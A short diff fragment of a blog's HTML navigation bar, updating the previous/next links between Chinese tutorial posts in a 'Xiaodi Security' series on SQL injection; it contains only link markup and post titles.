-                      <a href="/2022/10/17/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89/" title="【小迪安全】WEB漏洞-SQL注入之MYSQL注入（十三）">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">【小迪安全】WEB漏洞-SQL注入之MYSQL注入（十三）</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/10/11/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89/" title="【小迪安全】WEB漏洞-SQL注入之简要SQL注入（十二）">
-                        <span class="hidden-mobile">【小迪安全】WEB漏洞-SQL注入之简要SQL注入（十二）</span>
+                      <a href="/2022/10/13/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89/" title="【小迪安全】WEB漏洞-SQL注入之MYSQL注入（十三）">
+                        <span class="hidden-mobile">【小迪安全】WEB漏洞-SQL注入之MYSQL注入（十三）</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
